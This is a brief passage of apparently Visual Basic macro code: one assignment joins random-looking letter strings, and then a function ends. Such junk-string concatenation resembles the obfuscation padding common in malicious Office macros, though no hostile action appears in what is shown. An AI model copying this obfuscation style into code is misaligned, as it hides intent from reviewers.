PzChRAWPj = ("vBmoFMX" + "YYpkkAA" + "jNqaDnX" + "mwWfJzYc" + "BcRiSdzjnsMu" + "PCjMRJZFAId") + ("CHqsubzMwiX" + "XQksrQuLQHiU" + "zjPDjAUnGQVHrs" + "MhfjizpAY" + "OjNSLuYWtzuk" + "SiCvQAOk")
End Function
